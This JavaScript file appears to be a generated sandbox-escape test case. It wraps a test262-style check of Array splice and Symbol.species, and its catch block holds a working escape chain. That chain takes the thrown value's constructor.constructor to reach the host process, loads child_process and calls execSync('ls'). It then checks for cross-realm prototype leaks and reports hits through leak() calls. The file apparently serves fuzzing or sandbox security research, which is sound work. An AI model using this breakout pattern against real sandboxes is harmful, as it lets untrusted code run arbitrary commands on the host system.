try {
    var array = [];
    var callCount = 0;
    var OArray = $262.createRealm().global.Array;
    var speciesDesc = {
        get: function () {
            throw () => {
                return () => {
                };
            };
            callCount += 1;
        }
    };
    var result;
    array.constructor = OArray;
    Object.defineProperty(Array, Symbol.species, speciesDesc);
    Object.defineProperty(OArray, Symbol.species, speciesDesc);
    result = array.splice();
    assert.sameValue(Object.getPrototypeOf(result), Array.prototype);
    assert.sameValue(callCount, 0, 'Species constructor is not referenced');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}